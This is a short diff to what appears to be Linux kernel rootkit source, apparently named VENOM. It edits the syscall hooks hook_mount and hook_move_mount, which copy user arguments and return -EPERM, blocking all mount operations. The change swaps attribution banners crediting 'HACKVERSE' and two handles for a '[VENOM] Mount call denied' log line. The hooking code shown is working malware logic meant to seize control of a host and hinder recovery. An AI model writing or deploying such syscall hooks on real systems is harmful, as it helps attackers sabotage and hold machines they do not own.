@@ -35,10 +35,7 @@ asmlinkage long hook_mount(const char __user *dev_name,
     if (dir_name && strncpy_from_user(kdir, dir_name, sizeof(kdir) - 1) < 0)
         kdir[0] = '\0';
 
-		printk(KERN_INFO "====================================================\n");
-		printk(KERN_INFO "HACKVERSE HOOKED MOVE_MOUNT\n");
-		printk(KERN_INFO "@0xTrevo @Devil0x1\n");
-		printk(KERN_INFO "====================================================");
+		printk(KERN_INFO "[VENOM] Mount call denied\n");
 
     return -EPERM;
 }
@@ -58,11 +55,7 @@ asmlinkage long hook_move_mount(int from_dfd,
     if (to_pathname && strncpy_from_user(to_k, to_pathname, sizeof(to_k) - 1) < 0)
         to_k[0] = '\0';
 
-    printk(KERN_INFO "====================================================\n");
-    printk(KERN_INFO "HACKVERSE HOOKED MOVE_MOUNT\n");
-    printk(KERN_INFO "@0xTrevo @Devil0x1\n");
-    printk(KERN_INFO "====================================================");
-    
+    printk(KERN_INFO "[VENOM] Mount call denied\n");;
 
     return -EPERM;
 }
